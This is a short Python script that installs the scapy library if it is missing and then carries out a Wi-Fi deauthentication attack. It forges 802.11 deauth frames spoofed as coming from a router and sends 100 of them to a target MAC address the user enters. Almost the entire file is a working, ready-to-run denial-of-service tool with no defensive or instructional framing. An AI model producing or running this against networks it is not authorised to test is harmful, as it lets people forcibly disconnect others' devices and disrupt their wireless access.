import subprocess
import sys

def is_package_installed(package_name):
    try:
        __import__(package_name)
        return True
    except ImportError:
        return False

def install_package(package_name):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])

if not is_package_installed('scapy'):
    print("The 'scapy' library is not installed.")
    install = input("Would you like to install it now? (yes/no): ").strip().lower()
    
    if install == 'yes':
        print("Installing 'scapy'...")
        try:
            install_package('scapy')
            print("'scapy' has been installed successfully.")
        except Exception as e:
            print(f"An error occurred while installing 'scapy': {e}")
            sys.exit(1)
    else:
        print("You can continue without 'scapy', but the script may not work as intended.")
        sys.exit(0)

from scapy.all import *

def deauth(target_mac, router_mac, iface):
    packet = RadioTap() / Dot11(addr1=target_mac, addr2=router_mac, addr3=router_mac) / Dot11Deauth()
    sendp(packet, iface=iface, count=100, inter=0.1)

if __name__ == "__main__":
    target_mac = input("Enter the target MAC address: ")
    router_mac = input("Enter the router MAC address: ")
    iface = input("Enter the network interface (e.g., wlan0): ")
    deauth(target_mac, router_mac, iface)